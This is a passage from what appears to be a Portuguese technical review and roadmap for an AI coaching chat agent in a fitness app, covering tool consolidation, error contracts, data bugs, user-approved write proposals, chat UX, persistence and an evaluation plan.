| `get_sleep_profile` + `get_nutrition_profile` | `get_profile` (perfil unificado: idade, altura, peso, metas, unidades) |
| `get_goal_progress_history` | parâmetro `history_periods` em `list_goals` |
| `get_food_detail`, `get_saved_meal_detail` | parâmetro `id` na busca e na listagem |

Cada tool consolidada deve ter no máximo 1–2 parâmetros de "modo", porque modelos fracos erram com tools muito polimórficas.

### 6.5 Schemas — **Médio**

- 39 de 74 parâmetros não têm `description`, incluindo todos os `*_id` e datas (sem dica de `YYYY-MM-DD`).
- Faltam `enum`:
  - `list_body_measurements.type` (`weight, bodyFat, waist, …, bloodPressure`);
  - `list_goals.scope` e `metric`.
- `minimum`/`maximum` só existem no código, que corta os valores em silêncio.
- Nomes inconsistentes: `days`, `weeks_back`, `weeks`, `periods_back`, `limit`, `page_size`. O schema declara `weeks_back`, mas o handler lê `weeks` e só funciona por acaso, via o fallback `_back`.
- Entrada em snake_case, saída em camelCase, e alguns campos de saída em snake_case. Padronizar.

### 6.6 Contrato de erro — **Alto**

Hoje o mesmo tipo de falha volta de quatro jeitos diferentes:

- `ok:false, code:not_found`;
- `ok:true, data:{error}`;
- `ok:true, data:{found:false}`;
- dados vazios.

Há também dois problemas de validação:

- datas inválidas são **ignoradas em silêncio** (o filtro some);
- erros de tipo vazam a mensagem do Dart, por exemplo `type 'String' is not a subtype of type 'bool?'`.

Contrato único proposto:

```json
{"ok":false,"code":"not_found","message":"routine not found","hint":"call list_routines to get valid ids"}
{"ok":false,"code":"invalid_args","param":"start_date","expected":"YYYY-MM-DD","received":"01/09/2026"}
{"ok":false,"code":"internal_error","message":"query failed"}   // + debugPrint, sem vazar SQL
```

`AiToolArgs` precisa de leitores tipados:

- `boolean()`;
- `enumValue(key, allowed)`;
- `date(key)`, que lança erro com entrada inválida;
- `integer()`, que aceita camelCase e informa quando o valor foi ajustado ao intervalo.

O resultado deve ecoar `applied` (padrões e ajustes) e `ignored`.

### 6.7 Correção dos dados — **Médio**

| Problema | Onde |
|---|---|
| Treinos planejados e futuros entram nas análises de bem-estar (**Alto**, §2.1) | `ai_wellness_analytics_service.dart:360-406` |
| `progressPct` é uma fração de 0 a 1,5, não percentual (800/10.000 → `0.08`). `distanceRatioVsPreviousPeriod` é na verdade uma variação relativa. | `ai_tool_specs_goals.dart:38,82`; `ai_run_tool_service.dart:268` |
| Duração e eficiência do sono são resolvidas de jeitos diferentes entre as tools: a mesma noite mostra números diferentes. | `ai_sleep_tool_service.dart:294-341` vs `ai_wellness_analytics_service.dart:475-494` |
| `list_body_measurements` omite `secondary_value` (pressão diastólica), `side` (esquerdo/direito) e `is_fasted`. Também não tem filtro de data nem "último por tipo". | `ai_tool_specs_workouts.dart:244-252` |
| Filtro com string vazia (`type:''`, `scope:''`) devolve vazio em vez de tudo. | `ai_tool_specs_workouts.dart:230`; `ai_tool_specs_goals.dart:18-25` |
| Semanas parciais comparadas em `get_weekly_recovery_trend` (`direction` ruidosa). | `ai_wellness_analytics_service.dart:332-340` |
| Nomes de exercícios semeados em PT: quem usa o app em inglês busca "bench press" e não acha nada. Buscar também pelo nome traduzido (`locale_key`). | `exercise_repository.dart:34-64` |
| Metas sem unidade: kg, km, s e dias misturados em `currentValue`/`targetValue`. A preferência `distance_unit` é ignorada. | `goal_repository.dart:288` |
| `deepSleepMinutes` ainda é exposto, embora o motor v6 só classifique acordado/dormindo. | `ai_sleep_tool_service.dart:77` |
| 17 cálculos de janela com `Duration(days:)` em vez de `addDays`. Sem impacto no Brasil (sem horário de verão desde 2019), mas viola a convenção do projeto. Num fuso com DST, a janela de 31 dias virou 32 e `get_training_summary` contou 9 dias para 01–10/03. | `ai_workout_tool_service.dart:389,410,461,464,543,580`; `ai_sleep_tool_service.dart:134,156,179`; `ai_nutrition_tool_service.dart:95,136`; `ai_wellness_analytics_service.dart:84,245,349,363`; `ai_run_tool_service.dart:61,407`; `ai_tool_specs_workouts.dart:197` |

### 6.8 Lacunas de leitura (por valor)

1. **Periodização**: fase atual, metas da semana, dia de treino ou descanso, revisão semanal (`PeriodizationRepository.getDayPlan`, `getWeekMetrics`, `getPhaseMetrics`). Sem isso o treinador não responde "em que fase estou, qual a meta desta semana".
2. **Feed de recordes** (`StrengthRecordsRepository.recentRecords`) e comparação com o treino equivalente anterior (`findComparableWorkout`). "Bati algum recorde esta semana?" hoje exige N chamadas.
3. **Adaptações do plano de corrida** (`run_plan_adaptations`, `RunPlanCoach`). O recurso adaptativo é invisível para o agente.
4. Corrida: parciais por km, voltas e quilometragem de tênis.
5. Sono: desfecho do despertador (`wake_feeling`, `alarm_trigger`, janela inteligente).
6. Nutrição: maiores fontes de calorias e calorias por refeição (já existem no repositório).
7. Exercícios: categorias e uso, por exemplo "o que não treino há 3 semanas".
8. Medicamentos: só leitura, **opcional e desligado por padrão** (dado sensível).

---

## 7. Escritas: de 2 para N tipos de proposta

A decisão "sem tools de mutação; tudo por proposta e aprovação" **continua**. O que falta é um mecanismo genérico. Hoje o fluxo de rotina tem tabela, card, métodos e políticas próprios, e o de alimento guarda o estado dentro do JSON da mensagem de tool. Adicionar um tipo novo mexe em ~9 lugares.

### 7.1 Framework genérico de propostas — **G**

- **Tabela `ai_proposals`** (migração `step(61)`, copiando `ai_routine_proposals`), com as colunas:
  - `id`, `thread_id` (FK cascade), `tool_call_id`, `kind`, `subject_id`;
  - `base_hash`, `base_json`, `payload_json`, `preview_json`;
  - `status` (com CHECK), `result_json`, `error_code`;
  - `created_at`, `expires_at`, `resolved_at`.
- **`AiProposalHandler`**: `kind`, `toolSpec`, `prepare(args)`, `revalidate(txn)`, `apply(txn)`, `preview()`, `summaryFacts()` e `applyMode` (`transactional`, `userConfirmed` ou `service`).
- **`AiProposalService`** genérico: preparar, aprovar (*claim* → revalidar → aplicar), rejeitar, expirar, reaproveitar proposta idêntica pendente.
- **Card único** que renderiza `preview_json`: título, linhas, antes→depois e itens destrutivos destacados.
- **Idempotência**: o id da proposta vira a PK do que ela cria, então aprovar duas vezes não duplica.
- **Revisão otimista**: as tools de leitura devolvem `revision` (hash), e a proposta exige essa revisão. Assim, uma edição feita pelo usuário entre a leitura e a proposta não é revertida em silêncio (hoje a base é capturada no momento da proposta).
- **Custo real**: a maioria dos repositórios não aceita `DatabaseExecutor`/`Transaction`, então cada tipo novo exige métodos que aceitem transação.

### 7.2 Tipos por prioridade

| Proposta | Reaproveita | Observação |
|---|---|---|
| `propose_meal_log` (alimento ou refeição salva → data e refeição; vários itens num card) | `NutritionRepository.ensureMealLog`, `addMealLogItem`, `addSavedMealToDate` | A ação mais frequente num chat de nutrição. |
| `propose_body_measurement` | `BodyMeasurementRepository.addBodyMeasurement(sBatch)` | Trivial e de baixo risco. |
| `propose_goal` (criar, editar, ativar) | `GoalRepository.insert/update/toggleActive/suggestTarget` | |
| `propose_nutrition_goal` | `NutritionRepository.saveGoal`; `PeriodizationRepository.savePhaseSetup` | Respeitar que "semanas vividas não são reescritas". |
| `propose_workout_schedule` (agendar um dia da rotina, mover ou copiar treino) | `WorkoutRepository.importRoutineDayToWorkout`, `copyWorkoutToDate`, `updateWorkoutDate` | |
| `propose_run_plan_adjustment` | `RunPlanAdaptationEngine` + `RunPlanRepository.replaceWeeksFrom` + `recordAdaptation` | Encaixa perfeitamente na regra "propostas nunca são aplicadas automaticamente". |
| `propose_phase_change` | `appendPhase`, `savePhaseSetup`, `replanPlan` | |
| `propose_log_workout` (registrar treino passado) | `createWorkout`, `addSet`, `finishWorkout` | Mais validação. |
| `propose_memory_update` | nova (§3.7) | |

Medicamentos e alarmes ficam **fora**: alto risco, e precisam passar pelos serviços que espelham o lado nativo.

### 7.3 Endurecer a proposta de rotina (antes do framework)

- Corrigir §2.1 (rejeitar `source_*` em `create`, aplicar em duas fases, verificar linhas afetadas, diff honesto).
- Limites e validação:
  - número de dias, exercícios e séries;
  - faixas de valores (hoje `rest_time_seconds: 999999999` e `weight: 1e12` passam);
  - campos compatíveis com o tipo do exercício;
  - tipos de `notes`, `name` e `superset_group_id`. Um `Map` nesses campos passa na preparação e falha para sempre na aprovação.
- Uma linha de proposta com `action` desconhecida hoje derruba `openThread`. Tratar.
- Card com estado "aplicando" (hoje os botões continuam ativos) e erro localizado (hoje `error_message` é gravado em PT).

---

## 8. UX do chat

| Sev. | Item | Proposta |
|---|---|---|
| **Alto** | Sem cancelar; até ~6 min por chamada sem nada além de um spinner | Botão Parar (§4.3), tempo decorrido após ~15 s, streaming (§4.5). |
| **Alto** | O card de tool recolhido monta e faz *pretty-print* do JSON inteiro a cada rebuild: o `AnimatedCrossFade` constrói os dois filhos, com `jsonDecode` duas vezes | Construir os detalhes só quando expandido, decodificar uma vez (`initState`), limitar a prévia a 4–8 KB com "copiar tudo". |
| **Médio** | Tools aparecem como uma pilha de cards ("Consulta concluída") entre as bolhas, com JSON cru ao expandir. Os argumentos nunca aparecem. ~30 tools usam o mesmo ícone. | Uma linha por etapa: "Consultou: sono, nutrição (+2)" com chips e um resumo dos argumentos ("últimos 7 dias"). JSON cru só em "Detalhes"; "expandir automaticamente" vira opção de desenvolvedor. |
| **Médio** | Fases: `compacting` não tem texto; "Lendo N fontes" aparece enquanto, na verdade, se espera o modelo; retries mostram "Pensando…" | Status com os nomes reais das tools e um texto para cada etapa. |
| **Médio** | Banner de erro sempre mostra o bloco técnico (inclui ~41 nomes de tools), sem altura máxima e sem fechar. O retry do banner reenvia a última mensagem até para erros que não são de turno (renomear conversa, carregar antigas). | Uma linha localizada + "Detalhes" recolhível + "Copiar". Retry associado ao erro, botão de fechar, mensagens por classe de erro (§5). |
| **Médio** | Carregar mensagens antigas não preserva a posição de rolagem; a paginação por offset usa o tamanho em memória e pula ou duplica linhas (reproduzido) | Paginação por chave `(created_at, id)`, lista `reverse: true` com chaves estáveis. |
| **Médio** | Configurações: sem "Testar conexão", sem id manual de modelo, "Restaurar padrão" grava na hora e sem confirmação | §5 e §3.9. |
| **Médio** | Strings fixas visíveis: `'Imagem enviada'` vira título da conversa; mensagens de erro de tools e de validação em PT aparecem no card; datas do histórico em formato fixo | Usar o marcador genérico + l10n; mostrar `code` → texto localizado no card. |
| **Baixo** | A11y: o botão de remover imagem pendente tem ~17 dp efetivos; o card de tool não expõe estado expandido; respostas novas não são anunciadas | Ajustes pontuais. |
| **Baixo** | A chave `aiToolDiscoverAppCapabilities` e o rótulo da tool removida continuam nos ARB e em `ai_tool_registry_labels.dart`; a tabela de fallback PT duplica o ARB e já divergiu | Remover. |

---

## 9. Persistência e desempenho local

| Sev. | Item | Proposta |
|---|---|---|
| Médio | Payloads de tool guardados inteiros para sempre; sem retenção | Depois do turno, manter só um resumo e um hash do resultado das tools antigas (a UI mostra "resultado arquivado"). |
| Médio | `openThread`/`loadOlderMessages` fazem `jsonEncode` de cada mensagem carregada só para montar a assinatura de "já salvo" | Calcular a assinatura sob demanda (tamanho ou hash). |
| Médio | A busca usa `LIKE` (ASCII): "acao" não encontra "ação"; a contagem varre tudo de novo | Coluna normalizada (sem acentos, *casefold*) ou FTS4 `unicode61 remove_diacritics`; pular a contagem quando a página não está cheia. |
| Baixo | `deleteThread` carrega todos os payloads só para achar anexos; o caminho das imagens é absoluto (se o prefixo mudar, `deleteOrphans` apaga tudo) | Consultar só `attachments_json`; guardar caminho relativo. |
| Baixo | Restaurar um backup apaga as tabelas de IA, mas não reinicia o `AiChatService`: `_persistedMessages` antigo ressuscita a conversa | `AiChatService.reset()` após a restauração. |
| Baixo | `jsonEncode(wire)` com imagens base64 (até 5 imagens) roda na thread de UI a cada rodada | Medir o tamanho sem reserializar as imagens, ou usar `compute`. |

---

## 10. Qualidade: avaliação e observabilidade

Sem medição, nenhuma das mudanças acima pode ser validada. Hoje não existe teste que exercite `send()`, e a qualidade do agente nunca foi medida.

1. **Testes determinísticos do loop** com `AiService` falso: envio, rodadas de tools, orçamento, cancelamento, troca de conversa durante o turno, retry (com o banco verificado depois), recuperação de turno interrompido e duplo envio.
2. **Teste de orçamento**: no banco "usuário pesado", toda chamada padrão de toda tool fica até 6k chars; o custo fixo por request fica abaixo de um teto (teste de regressão de tokens).
3. **Harness de avaliação** em `tool/ai_eval/`, rodado manualmente contra um provedor real e no mesmo padrão de `tool/benchmark/`:
   - um banco fixture e ~40 cenários em PT e EN: domínio único, cruzado, continuação herdando período, sem dados, proposta de rotina e refeição, imagem, *prompt injection* numa nota de exercício;
   - métricas: tools corretas, respostas cujos números existem nos resultados das tools, rodadas por turno, tokens de entrada, em cache e de saída, latência e taxa de falha;
   - rodar por modelo para preencher o perfil de capacidades (§5) e decidir as flags por modelo (§4.1).
4. **Inspetor de turno só em build de debug**: tamanho do wire, rodadas, `cached_tokens` e tempo por etapa. Nada é exibido ao usuário final nem persistido, o que respeita a decisão "sem rastreio de custo".

---

## 11. Decisões do CLAUDE.md revisitadas

| Decisão atual | Recomendação | Por quê |
|---|---|---|
| Sem tools de mutação; proposta + aprovação | **Manter** e generalizar (§7) | Segurança correta; falta cobertura. |
| Catálogo completo e estável em toda rodada | **Manter**, mas menor (§6) e com domínios opcionais por configuração | A estabilidade é o que permite o cache. Desligar um domínio (por exemplo medicamentos) muda o catálogo só quando a configuração muda. |
| Layout amigável ao cache (estático → dinâmico → histórico) | **Mudar** a ordem (§3.2) | As dicas por turno antes do histórico impedem o cache do histórico. |
| Loop limitado por orçamento | **Manter**; rodada final com `tool_choice:none` | |
| Truncamento só no wire | **Mudar**: o orçamento é aplicado na origem; o wire fica como rede de segurança com JSON válido | §3.5, §6.2. |
| Resumo rolante por conversa | **Manter** com histerese, idioma do app e modelo utilitário | §3.3. |
| Sem streaming | **Revisitar** | Maior ganho de percepção de velocidade; timeout por inatividade. |
| Sem rastreio de tokens/custo | **Manter para o usuário**; diagnóstico só em debug | §10. |
| `tool_choice: required` por heurística + dicas por regex | **Remover** | Só funciona em PT, quebra o cache e desvia turnos. |
| `TextSanitizer` mínimo | **Manter** | |

---

## 12. Roteiro

### Fase 0 — Parar o sangramento (≈ 1 semana)

| # | Item | Esforço |
|---|---|---|
| 0.1 | Bloquear abrir, criar e excluir conversa e retry durante um turno + flag síncrona de envio | P |
| 0.2 | Rotina: rejeitar `source_*` em `create`, aplicar em duas fases, verificar linhas afetadas | P–M |
| 0.3 | Retry apaga as mensagens truncadas (e propostas) no banco; reset do resumo | P |
| 0.4 | Persistir a mensagem do usuário no envio | P |
| 0.5 | Análises de bem-estar: só treinos concluídos e até hoje | P |
| 0.6 | Não apagar prompts personalizados curtos | P |
| 0.7 | Corrigir `_safeTechnicalMessage` | P |
| 0.8 | `imageBuilder` sem rede no Markdown | P |
| 0.9 | Diretiva de idioma pelo `appLanguageCode` + `locale` real no contexto + resumo no idioma do app | P |
| 0.10 | Repassar `reasoning_content`/`reasoning_details`/`extra_content` dentro do turno | M |
| 0.11 | Rodada final, regeneração e resumo da proposta com `tools` + `tool_choice:none` | P |
| 0.12 | Testes do loop com provedor falso cobrindo os cenários acima | M |

**Critério de saída**: os cenários reproduzidos viram testes que passam; um usuário com o app em inglês recebe respostas em inglês; DeepSeek thinking e Gemini 3 completam um turno com 2+ rodadas de tools.

### Fase 1 — Medir, depois cortar tokens (≈ 1–2 semanas)

| # | Item | Esforço |
|---|---|---|
| 1.1 | Harness de avaliação (`tool/ai_eval/`) e baseline atual | M |
| 1.2 | Novo layout do wire; remover as dicas; `prompt_cache_key`/`cache_control` | M |
| 1.3 | Compactação com histerese + stubs de resultados antigos | M |
| 1.4 | Prompt do produto em inglês, deduplicado, com segurança na parte fixa; instruções personalizadas separadas (com migração) | M |
| 1.5 | Snapshot do dia no lugar de `<workout_data>`; remover o "modo de contexto" | M |
| 1.6 | Remover roteadores regex e desvio do alimento manual; flag por modelo se a avaliação mostrar necessidade | M |
| 1.7 | Persistir a compatibilidade por modelo; respeitar `Retry-After`; não repetir timeout | P |

**Metas**:

- custo fixo ≤ 5k tokens por request;
- ≥ 70% dos tokens de entrada servidos do cache em conversas de 5+ turnos (OpenAI/DeepSeek);
- nenhuma chamada extra de resumo na maioria dos turnos;
- rodadas por turno ≤ 2,5 em média na avaliação.

### Fase 2 — Tools (≈ 2 semanas)

| # | Item | Esforço |
|---|---|---|
| 2.1 | `AiToolResultShaper` (arredondar, tabular, limitar, mais recente primeiro) + teste de orçamento | M |
| 2.2 | Contrato de erro único + leitores tipados em `AiToolArgs` | M |
| 2.3 | Consolidar as 12 tools redundantes (41 → ~30); limpar schemas; descrições em inglês | M |
| 2.4 | Correções de §6.7 | M |
| 2.5 | Novas leituras: periodização, feed de recordes, adaptações do plano de corrida | M |

**Meta**: 0 chamadas padrão acima de 6k chars; catálogo ≤ 11k chars; acerto de tool ≥ 90% na avaliação.

### Fase 3 — Harness e UX (≈ 2 semanas)

| # | Item | Esforço |
|---|---|---|
| 3.1 | `TurnContext` + persistência incremental + status do turno + recuperação persistente | M |
| 3.2 | Cancelar (abortar HTTP) | P–M |
| 3.3 | Streaming SSE com timeout por inatividade (fallback sem streaming) | G |
| 3.4 | Etapas de tools compactas, cards leves, banner de erro enxuto, mensagens por classe de erro | M |
| 3.5 | Configurações: testar conexão, id manual de modelo, perfil de capacidades, consentimento, domínios opcionais | M |
| 3.6 | Paginação por chave, lista invertida, busca sem acentos, retenção de payloads | M |

### Fase 4 — Escritas e memória (≈ 2–3 semanas)

| # | Item | Esforço |
|---|---|---|
| 4.1 | Framework genérico de propostas + migração da rotina + diff honesto + revisão otimista | G |
| 4.2 | `propose_meal_log`, `propose_body_measurement`, `propose_goal` | M (cada ~1–2 dias) |
| 4.3 | `propose_run_plan_adjustment`, `propose_workout_schedule`, `propose_nutrition_goal` | M |
| 4.4 | Memória de longo prazo + tela de gerenciamento | M |
| 4.5 | Eventos de resultado de proposta para o modelo (aplicada, rejeitada, obsoleta) sem chamada extra | P |

Ao fim de cada fase, atualizar a seção "AI Coach" do `CLAUDE.md`: contagem de tools, layout do wire, decisões revisadas.

---

## Fontes

- Gemini — thought signatures e a exigência na camada OpenAI: <https://ai.google.dev/gemini-api/docs/thought-signatures>, <https://discuss.ai.google.dev/t/openai-api-compatibility-broken-due-to-thought-signature-on-gemini-3-pro-preview/109823>
- DeepSeek — modo thinking com tools exige devolver `reasoning_content`: <https://api-docs.deepseek.com/guides/thinking_mode/>
- OpenRouter — `reasoning_details`: <https://www.openrouter.ai/docs/guides/best-practices/reasoning-tokens>; cache com `cache_control` para Anthropic e Gemini: <https://openrouter.ai/docs/prompt-caching>
- OpenAI — cache de prompt, `prompt_cache_key` e `cached_tokens`: <https://developers.openai.com/api/docs/guides/prompt-caching/index.html>, <https://developers.openai.com/cookbook/examples/prompt_caching101>
